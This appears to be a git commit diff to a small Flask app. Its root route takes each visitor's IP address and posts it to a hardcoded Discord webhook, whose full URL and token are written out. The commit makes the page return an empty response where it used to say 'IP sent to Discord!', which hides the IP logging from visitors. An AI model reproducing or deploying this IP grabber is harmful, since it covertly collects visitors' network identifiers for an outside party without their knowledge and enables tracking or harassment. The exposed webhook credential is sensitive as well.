a8607ed17ad8bec7aa49a52e056c6942e80669b1
560h <gangtoolsdiscord@gmail.com>
2025-03-28 21:35:32 +0100

    Update app.py

--- app.py
+++ app.py
@@ -4,9 +4,7 @@ import requests
 
 app = Flask(__name__)
 
-
 DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1355274305583452190/YFoPVpsJ6jFwXcBM6RJesckQFX8UFVB3hyZA9n3hrDozpy_2cN3p699vWZ408uF45-2j'  
-
 
 def send_ip_to_discord(ip):
     payload = {
@@ -19,14 +17,12 @@ def send_ip_to_discord(ip):
     else:
         print(f'look what youve done {response.status_code}')
 
-
 @app.route('/')
 def index():
-    
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     send_ip_to_discord(ip)
-    return 'IP sent to Discord!'
+    return ''
 
 if __name__ == '__main__':
-    
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 3000)))
+
